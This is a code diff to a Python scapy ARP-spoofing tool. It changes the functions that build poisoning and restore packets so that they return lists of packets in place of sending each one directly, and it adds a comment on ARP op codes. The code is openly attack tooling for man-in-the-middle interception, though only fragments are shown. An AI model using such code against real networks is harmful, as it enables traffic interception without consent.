@@ -4,6 +4,7 @@ from scapy.all import *
 def create_arp_packet(packet_Information: dict):
 
     # op = 2 sets the arp table
+    # op = 1 requests arp information
     # hwsrc and hwdst = MAC address of src and dst
     # psrc and pdst = ip adress of src and dst
     # Set ipdst and macdst of target, such that arp_spoof reaches them
@@ -34,6 +35,8 @@ def set_up_arp_packet(inf_victim: dict, inf_target: dict, inf_host: dict, poison
 
 
 def poison_victims(victims: list[dict], targets: list[dict], hosts: list[dict]):
+    # Create return array for packets
+    poison_packets: list = []
     for host in hosts:
         for victim in victims:
             for target in targets:
@@ -41,15 +44,19 @@ def poison_victims(victims: list[dict], targets: list[dict], hosts: list[dict]):
                 if host != victim != target != host:
                     arp_poison_packet = set_up_arp_packet(
                         victim, target, host, poison=True)
-                    send_packet(arp_poison_packet)
+                    poison_packets += [arp_poison_packet]
+    return poison_packets
 
 
 def restore_victims(victims: list[dict], targets: list[dict]):
+    # Create return array for packets
+    restore_packets: list = []
     for victim in victims:
         for target in targets:
             if victim != target:
                 arp_restore_packet = set_up_arp_packet(victim, target, {})
-                send_packet(arp_restore_packet)
+                restore_packets += [arp_restore_packet]
+    return restore_packets
 
 
 # send sends on layer 3, sendp sends at layer 2
